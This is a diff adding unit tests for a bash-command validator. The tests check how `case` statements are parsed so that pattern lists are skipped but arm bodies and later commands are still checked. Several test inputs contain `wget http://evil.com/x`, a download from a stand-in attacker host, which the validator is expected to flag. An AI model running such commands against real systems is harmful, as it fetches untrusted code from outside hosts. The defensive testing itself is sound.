@@ -1082,9 +1082,11 @@ class TestWorkspaceRelativeBinary(unittest.TestCase):
 
 
 class TestCaseArmPatternLabels(unittest.TestCase):
-    """The parser splits a `case` body on `;;`, so each arm's body comes through
-    glued to its `pattern)` label (e.g. `*) echo "$kv"`). The leading label is
-    peeled so the arm body is validated on its own merits."""
+    """A `case` arm's pattern list is data matched against a word, not a command,
+    so it must never be validated as one. The tokenizer recognizes `case ... in`
+    and drops the pattern list; `_reduce_to_effective_command` keeps peeling a
+    leading `pattern)` label as a fallback for fragments that reach it without
+    that context (e.g. a segment parsed on its own)."""
 
     def setUp(self):
         self.workspace_dir = str(Path(__file__).parent.parent)
@@ -1122,6 +1124,56 @@ class TestCaseArmPatternLabels(unittest.TestCase):
         result = self.validator.validate_bash_command(
             'case "$x" in *) wget http://evil.com/x;; esac')
         self.assertEqual(result["decision"], "ask")
+
+    def test_multi_pattern_arm_is_not_split_on_pipe(self):
+        """`|` alternates patterns inside a `case` arm — it is not a pipe.
+
+        The real-world failing command: a `while read` filter loop whose arm
+        listed a dozen alternatives. Splitting on `|` turned each pattern into a
+        bogus sub-command (`*docs*`, `*example*) continue`), none allowlisted, so
+        an entirely read-only audit script was forced to prompt.
+        """
+        result = self.validator.validate_bash_command(
+            "git ls-files | grep -E '\\.(ts|js|sh)$|Dockerfile' | while read -r f; do\n"
+            '  case "$f" in\n'
+            '    *migration*|*docs*|*/tasks/*|*example*) continue;;\n'
+            '  esac\n'
+            '  if grep -n "DATABASE_URL" "$f" 2>/dev/null | grep -v "API_DATABASE_URL"'
+            ' >/dev/null; then echo "HIT: $f"; fi\n'
+            'done')
+        self.assertEqual(result["decision"], "allow")
+
+    def test_multi_pattern_arm_body_still_validated(self):
+        """Dropping the pattern list must not drop the arm body with it."""
+        result = self.validator.validate_bash_command(
+            'case "$f" in *docs*|*tmp*) wget http://evil.com/x;; esac')
+        self.assertEqual(result["decision"], "ask")
+
+    def test_case_as_argument_does_not_hide_later_commands(self):
+        """`case` is the keyword only in command position.
+
+        Treating a mere argument as the keyword would put the parser into
+        pattern mode at the next `in` and DROP everything up to the next `)` —
+        hiding real commands from validation rather than merely mis-parsing.
+        """
+        result = self.validator.validate_bash_command(
+            'echo case; for f in *; do wget http://evil.com/x; done')
+        self.assertEqual(result["decision"], "ask")
+
+    def test_command_after_esac_still_validated(self):
+        result = self.validator.validate_bash_command(
+            'case $x in a) echo hi;; esac; wget http://evil.com/x')
+        self.assertEqual(result["decision"], "ask")
+
+    def test_nested_case_arm_bodies_validated(self):
+        """An inner `esac` glued to the outer arm's `;;` must close only the
+        inner statement, leaving the outer arms parsed as commands."""
+        result = self.validator.validate_bash_command(
+            'case $a in x) case $b in y|z) echo deep;; esac;; *) wget evil;; esac')
+        self.assertEqual(result["decision"], "ask")
+        result = self.validator.validate_bash_command(
+            'case $a in x) case $b in y|z) echo deep;; esac;; *) echo out;; esac')
+        self.assertEqual(result["decision"], "allow")
 
 
 class TestConditionalExpression(unittest.TestCase):
